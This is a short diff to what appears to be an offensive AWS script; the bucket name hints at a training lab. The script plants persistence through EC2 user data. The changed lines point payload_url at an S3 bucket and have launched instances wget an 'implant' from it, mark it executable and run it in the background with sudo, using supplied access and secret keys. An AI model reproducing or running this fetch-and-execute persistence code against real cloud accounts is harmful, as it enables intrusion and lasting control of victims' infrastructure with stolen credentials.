@@ -6,7 +6,7 @@ import time
 import json
 
 region = "us-west-2"
-payload_url = 'http://nlcuto0tw09pnlu573pvaabek5qvek.burpcollaborator.net'
+payload_url = 'https://cg-secret-s3-bucket-new-aws.s3.amazonaws.com/cloudllama'
 
 def listActions():
     print('CreatePolicy ✓')
@@ -49,7 +49,9 @@ def ec2userdata_persist(ak,sk):
             - mkdir /tmp/implant
             - cd /tmp/implant
             - wget -O implant %s
-            - ./implant
+            - sudo su ubuntu
+            - sudo chmod +x implant
+            - sudo ./implant &
         """ % payload_url
     ec2.create_instances(
         ImageId='ami-003634241a8fcdec0', 
